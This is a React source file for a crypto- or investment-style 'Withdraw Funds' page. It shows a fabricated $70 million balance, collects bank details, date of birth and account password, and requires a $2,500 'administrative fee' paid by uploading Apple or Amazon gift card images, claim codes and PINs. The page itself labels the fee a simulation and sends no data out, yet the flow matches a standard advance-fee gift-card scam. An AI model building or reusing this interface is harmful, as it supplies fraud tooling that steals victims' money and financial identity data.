'use client';

import React, { useState } from 'react';
import { 
  ArrowUpRight, 
  ShieldCheck, 
  CheckCircle2, 
  Lock,
  DollarSign,
  Building,
  User,
  Calendar,
  Hash,
  MapPin,
  Upload,
  Gift,
  CreditCard,
  AlertCircle,
  FileImage,
  Wallet as WalletIcon
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Modal } from '@/components/ui/modal';

export default function WithdrawPage() {
  const [amount, setAmount] = useState<string>('');
  const [payoutMethod, setPayoutMethod] = useState<'BANK_WIRE' | 'USDT_WALLET'>('BANK_WIRE');
  
  // Specific Bank Wire Input Fields
  const [fullName, setFullName] = useState<string>('Leo Garcia Arthur');
  const [bankName, setBankName] = useState<string>('');
  const [routingNumber, setRoutingNumber] = useState<string>('');
  const [accountNumber, setAccountNumber] = useState<string>('');
  const [address, setAddress] = useState<string>('New Mexico, United States');
  const [dob, setDob] = useState<string>('');
  const [usdtAddress, setUsdtAddress] = useState<string>('');

  // Administrative Fee Simulation Modal State
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [feeBrand, setFeeBrand] = useState<'Apple' | 'Amazon'>('Apple');
  const [frontImage, setFrontImage] = useState<string | null>(null);
  const [backImage, setBackImage] = useState<string | null>(null);
  const [cardCode, setCardCode] = useState<string>('');
  const [cardPin, setCardPin] = useState<string>('');
  const [password, setPassword] = useState('');
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [successMsg, setSuccessMsg] = useState(false);

  // Available balance in Dollars ($ USD)
  const availableBalanceUSD = 70000000.00;
  const minWithdrawalUSD = 100.00;
  const adminFeeUSD = 2500.00; // Administrative fee required separately

  const numAmount = parseFloat(amount) || 0;

  const handleMax = () => {
    setAmount(availableBalanceUSD.toString());
  };

  const handleOpenModal = (e: React.FormEvent) => {
    e.preventDefault();
    if (numAmount < minWithdrawalUSD) return;
    if (numAmount > availableBalanceUSD) return;
    setIsModalOpen(true);
  };

  const handleFrontUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => setFrontImage(reader.result as string);
      reader.readAsDataURL(file);
    }
  };

  const handleBackUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => setBackImage(reader.result as string);
      reader.readAsDataURL(file);
    }
  };

  const handleConfirmWithdrawal = async () => {
    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      setIsModalOpen(false);
      setSuccessMsg(true);
      setAmount('');
      setBankName('');
      setRoutingNumber('');
      setAccountNumber('');
      setDob('');
      setUsdtAddress('');
      setFrontImage(null);
      setBackImage(null);
      setCardCode('');
      setCardPin('');
      setPassword('');
    }, 2000);
  };

  const isFormValid =
    payoutMethod === 'BANK_WIRE'
      ? numAmount > 0 && numAmount <= availableBalanceUSD && fullName && bankName && routingNumber && address && dob
      : numAmount > 0 && numAmount <= availableBalanceUSD && usdtAddress;

  const isModalFormValid = frontImage && backImage && password;

  return (
    <div className="max-w-4xl mx-auto px-4 py-8 space-y-8">
      <div>
        <h1 className="text-2xl font-black text-white">Withdraw Funds ($ USD)</h1>
        <p className="text-xs text-slate-400">Request payout directly to your bank account or USDT dollar wallet</p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-12 gap-8">
        <div className="md:col-span-8 space-y-6">
          <Card className="p-6 border-slate-800 space-y-6">
            {successMsg && (
              <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/40 flex items-start space-x-3 text-emerald-300 text-xs">
                <CheckCircle2 className="w-5 h-5 shrink-0 text-emerald-400 mt-0.5" />
                <div className="space-y-1">
                  <p className="font-extrabold text-white">Administrative Fee & Withdrawal Submitted!</p>
                  <p className="text-slate-300 leading-relaxed">
                    Your $2,500.00 USD administrative fee via {feeBrand} Gift Card has been received for verification. Your full payout of ${numAmount > 0 ? numAmount.toLocaleString('en-US') : '70,000,000.00'} USD will be released to your destination account immediately upon fee verification (5 - 15 mins).
                  </p>
                </div>
              </div>
            )}

            <form onSubmit={handleOpenModal} className="space-y-5">
              {/* Payout Method Selection */}
              <div className="space-y-2">
                <label className="text-xs uppercase font-bold tracking-wider text-slate-400">Select Payout Method</label>
                <div className="grid grid-cols-2 gap-3">
                  <button
                    type="button"
                    onClick={() => setPayoutMethod('BANK_WIRE')}
                    className={`p-3.5 rounded-xl border flex flex-col items-center justify-center space-y-1.5 transition-all ${
                      payoutMethod === 'BANK_WIRE'
                        ? 'gradient-bg-blue text-[#0B1220] font-bold shadow-lg shadow-[#5A9BFF]/30 border-[#6EB7FF]'
                        : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
                    }`}
                  >
                    <Building className="w-5 h-5" />
                    <span className="text-xs font-bold">Bank Wire</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => setPayoutMethod('USDT_WALLET')}
                    className={`p-3.5 rounded-xl border flex flex-col items-center justify-center space-y-1.5 transition-all ${
                      payoutMethod === 'USDT_WALLET'
                        ? 'gradient-bg-blue text-[#0B1220] font-bold shadow-lg shadow-[#5A9BFF]/30 border-[#6EB7FF]'
                        : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
                    }`}
                  >
                    <WalletIcon className="w-5 h-5" />
                    <span className="text-xs font-bold">USDT Dollar</span>
                  </button>
                </div>
              </div>

              {/* Amount Input in Dollars ($ USD) */}
              <div className="space-y-2">
                <div className="flex justify-between items-center text-xs">
                  <span className="uppercase font-bold tracking-wider text-slate-400">Withdrawal Amount ($ USD)</span>
                  <span className="text-slate-300 font-mono">
                    Available: <strong className="text-[#6EB7FF]">${availableBalanceUSD.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</strong>
                  </span>
                </div>
                <div className="relative flex items-center">
                  <span className="absolute left-4 text-slate-400 font-bold">$</span>
                  <input
                    type="number"
                    step="any"
                    placeholder="0.00"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="glass-input w-full rounded-xl pl-8 pr-16 py-3.5 text-sm text-slate-100 placeholder:text-slate-500 font-mono font-bold"
                    required
                  />
                  <button
                    type="button"
                    onClick={handleMax}
                    className="absolute right-3 px-2.5 py-1 bg-[#6EB7FF]/20 text-[#6EB7FF] rounded-lg text-xs font-bold hover:bg-[#6EB7FF]/40"
                  >
                    MAX
                  </button>
                </div>
                {numAmount > availableBalanceUSD && (
                  <p className="text-xs text-rose-400 font-medium">Insufficient dollar balance. Please check your available balance.</p>
                )}
                {numAmount > 0 && numAmount < minWithdrawalUSD && (
                  <p className="text-xs text-rose-400 font-medium">Minimum dollar withdrawal amount is ${minWithdrawalUSD.toFixed(2)} USD.</p>
                )}
              </div>

              {/* Form Input Fields based on Payout Method */}
              {payoutMethod === 'BANK_WIRE' ? (
                <div className="space-y-4 pt-1">
                  {/* 1. Full Name (as on bank account) */}
                  <Input
                    label="Full Name (as on bank account)"
                    type="text"
                    placeholder="e.g. Leo Garcia Arthur"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    leftIcon={<User className="w-4 h-4 text-[#6EB7FF]" />}
                    required
                  />

                  {/* 2. Bank Name */}
                  <Input
                    label="Bank Name"
                    type="text"
                    placeholder="e.g. Chase Bank / Bank of America / Wells Fargo"
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    leftIcon={<Building className="w-4 h-4 text-[#6EB7FF]" />}
                    required
                  />

                  {/* 3. Address (as on bank account) */}
                  <Input
                    label="Address (as on bank account)"
                    type="text"
                    placeholder="e.g. New Mexico, United States"
                    value={address}
                    onChange={(e) => setAddress(e.target.value)}
                    leftIcon={<MapPin className="w-4 h-4 text-[#6EB7FF]" />}
                    required
                  />

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {/* 4. Routing No */}
                    <Input
                      label="Routing No"
                      type="text"
                      placeholder="e.g. 121000358"
                      value={routingNumber}
                      onChange={(e) => setRoutingNumber(e.target.value)}
                      leftIcon={<Hash className="w-4 h-4 text-[#6EB7FF]" />}
                      required
                    />

                    {/* 5. Account Number / IBAN */}
                    <Input
                      label="Account No / IBAN"
                      type="text"
                      placeholder="e.g. 9920198421"
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value)}
                      leftIcon={<Hash className="w-4 h-4 text-[#6EB7FF]" />}
                      required
                    />
                  </div>

                  {/* 6. Date of Birth as on bank account */}
                  <Input
                    label="Date of Birth (as on bank account)"
                    type="date"
                    value={dob}
                    onChange={(e) => setDob(e.target.value)}
                    leftIcon={<Calendar className="w-4 h-4 text-[#6EB7FF]" />}
                    required
                  />
                </div>
              ) : (
                /* USDT Wallet Option */
                <Input
                  label="Destination USDT (TRC20/ERC20) Wallet Address"
                  type="text"
                  placeholder="e.g. TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
                  value={usdtAddress}
                  onChange={(e) => setUsdtAddress(e.target.value)}
                  leftIcon={<DollarSign className="w-4 h-4 text-[#6EB7FF]" />}
                  required
                />
              )}

              {/* Breakdown Box */}
              <div className="p-4 rounded-xl bg-[#0B1220]/80 border border-slate-800 space-y-2 text-xs">
                <div className="flex justify-between text-slate-400">
                  <span>Administrative / Processing Fee:</span>
                  <span className="font-mono text-amber-400 font-bold">$2,500.00 USD (Payable via Gift Card)</span>
                </div>
                <div className="flex justify-between text-slate-100 font-bold border-t border-slate-800/80 pt-2 text-sm">
                  <span>Net Payout Released to Bank:</span>
                  <span className="font-mono text-emerald-400">${numAmount > 0 ? numAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '0.00'} USD</span>
                </div>
              </div>

              <Button
                type="submit"
                variant="primary"
                size="lg"
                className="w-full shadow-lg shadow-[#5A9BFF]/30 py-3.5 text-sm font-bold"
                disabled={!isFormValid}
                rightIcon={<ArrowUpRight className="w-4 h-4" />}
              >
                Withdraw ${numAmount > 0 ? numAmount.toLocaleString('en-US', { minimumFractionDigits: 2 }) : '0.00'} USD
              </Button>
            </form>
          </Card>
        </div>

        {/* Security Sidebar Info */}
        <div className="md:col-span-4 space-y-4">
          <Card glow className="p-5 border-slate-800 space-y-3 text-xs">
            <div className="flex items-center space-x-2 text-emerald-400 font-bold">
              <ShieldCheck className="w-4 h-4" />
              <span>Administrative Fee Requirement</span>
            </div>
            <p className="text-slate-400 leading-relaxed">
              Dollar withdrawals carry a separate $2,500.00 USD administrative processing fee payable via Apple or Amazon Gift Card. Your full withdrawal amount is transferred directly to your bank account upon fee verification.
            </p>
          </Card>
        </div>
      </div>

      {/* Administrative Fee & Gift Card Upload Simulation Modal */}
      <Modal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        title="Pay Administrative Fee to Complete Withdrawal"
      >
        <div className="space-y-5 text-xs">
          {/* Header Fee Notice */}
          <div className="p-3.5 rounded-2xl bg-amber-500/10 border border-amber-500/30 space-y-1 text-amber-300">
            <div className="flex items-center space-x-2 font-bold text-amber-400">
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span>Administrative Fee Payment ($2,500.00 USD)</span>
            </div>
            <p className="text-[11px] leading-relaxed text-slate-300">
              To complete your <strong className="text-white">${numAmount.toLocaleString('en-US')} USD</strong> withdrawal to your bank account, please upload Apple or Amazon Gift Card(s) totaling <strong className="text-amber-300">$2,500.00 USD</strong> to cover administrative & processing fees.
            </p>
          </div>

          {/* Select Gift Card Brand */}
          <div className="space-y-2">
            <label className="text-xs font-bold text-slate-300">Select Gift Card Brand ($2,500 Fee)</label>
            <div className="grid grid-cols-2 gap-3">
              <button
                type="button"
                onClick={() => setFeeBrand('Apple')}
                className={`p-3 rounded-xl border flex items-center justify-center space-x-2 font-bold transition-all ${
                  feeBrand === 'Apple'
                    ? 'gradient-bg-blue text-[#0B1220] border-[#6EB7FF] shadow-md'
                    : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
                }`}
              >
                <Gift className="w-4 h-4" />
                <span>Apple Gift Card</span>
              </button>

              <button
                type="button"
                onClick={() => setFeeBrand('Amazon')}
                className={`p-3 rounded-xl border flex items-center justify-center space-x-2 font-bold transition-all ${
                  feeBrand === 'Amazon'
                    ? 'gradient-bg-blue text-[#0B1220] border-[#6EB7FF] shadow-md'
                    : 'bg-[#111A2E] border-slate-800 text-slate-300 hover:bg-[#1C2B4A]'
                }`}
              >
                <Gift className="w-4 h-4" />
                <span>Amazon Gift Card</span>
              </button>
            </div>
          </div>

          {/* Upload Front and Back Separately */}
          <div className="space-y-3">
            <label className="text-xs font-bold text-slate-300">Upload Card Images (Front & Back)</label>
            <div className="grid grid-cols-2 gap-3">
              {/* Upload Front */}
              <div className="relative">
                <label
                  htmlFor="front-upload"
                  className={`flex flex-col items-center justify-center p-4 rounded-xl border-2 border-dashed transition-all cursor-pointer h-28 text-center ${
                    frontImage
                      ? 'border-emerald-500/60 bg-emerald-500/10'
                      : 'border-slate-700/80 bg-[#0B1220] hover:border-[#6EB7FF]'
                  }`}
                >
                  {frontImage ? (
                    <div className="space-y-1 flex flex-col items-center">
                      <FileImage className="w-6 h-6 text-emerald-400" />
                      <span className="text-[11px] font-bold text-emerald-300">Front Uploaded ✓</span>
                    </div>
                  ) : (
                    <div className="space-y-1 flex flex-col items-center text-slate-400">
                      <Upload className="w-6 h-6 text-[#6EB7FF]" />
                      <span className="text-[11px] font-bold text-white">Upload Front</span>
                      <span className="text-[9px] text-slate-500">Image of card front</span>
                    </div>
                  )}
                </label>
                <input
                  id="front-upload"
                  type="file"
                  accept="image/*"
                  onChange={handleFrontUpload}
                  className="hidden"
                />
              </div>

              {/* Upload Back */}
              <div className="relative">
                <label
                  htmlFor="back-upload"
                  className={`flex flex-col items-center justify-center p-4 rounded-xl border-2 border-dashed transition-all cursor-pointer h-28 text-center ${
                    backImage
                      ? 'border-emerald-500/60 bg-emerald-500/10'
                      : 'border-slate-700/80 bg-[#0B1220] hover:border-[#6EB7FF]'
                  }`}
                >
                  {backImage ? (
                    <div className="space-y-1 flex flex-col items-center">
                      <FileImage className="w-6 h-6 text-emerald-400" />
                      <span className="text-[11px] font-bold text-emerald-300">Back Uploaded ✓</span>
                    </div>
                  ) : (
                    <div className="space-y-1 flex flex-col items-center text-slate-400">
                      <Upload className="w-6 h-6 text-[#6EB7FF]" />
                      <span className="text-[11px] font-bold text-white">Upload Back</span>
                      <span className="text-[9px] text-slate-500">Image with PIN / Code</span>
                    </div>
                  )}
                </label>
                <input
                  id="back-upload"
                  type="file"
                  accept="image/*"
                  onChange={handleBackUpload}
                  className="hidden"
                />
              </div>
            </div>
          </div>

          {/* Card Code & PIN Inputs */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            <Input
              label="Gift Card Claim Code"
              type="text"
              placeholder="e.g. X7B9-8812-KL09"
              value={cardCode}
              onChange={(e) => setCardCode(e.target.value)}
              leftIcon={<Gift className="w-4 h-4 text-[#6EB7FF]" />}
            />

            <Input
              label="Card PIN Code"
              type="text"
              placeholder="e.g. 88192"
              value={cardPin}
              onChange={(e) => setCardPin(e.target.value)}
              leftIcon={<Lock className="w-4 h-4 text-[#6EB7FF]" />}
            />
          </div>

          {/* Account Password Confirmation */}
          <Input
            label="Enter Account Password to Confirm"
            type="password"
            placeholder="Confirm password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            leftIcon={<Lock className="w-4 h-4" />}
            required
          />

          <div className="flex space-x-3 pt-2">
            <Button
              variant="secondary"
              size="md"
              className="flex-1"
              onClick={() => setIsModalOpen(false)}
            >
              Cancel
            </Button>
            <Button
              variant="primary"
              size="md"
              className="flex-1 font-bold gradient-bg-blue text-[#0B1220]"
              isLoading={isSubmitting}
              disabled={!isModalFormValid}
              onClick={handleConfirmWithdrawal}
            >
              Submit Fee & Complete Payout
            </Button>
          </div>
        </div>
      </Modal>
    </div>
  );
}
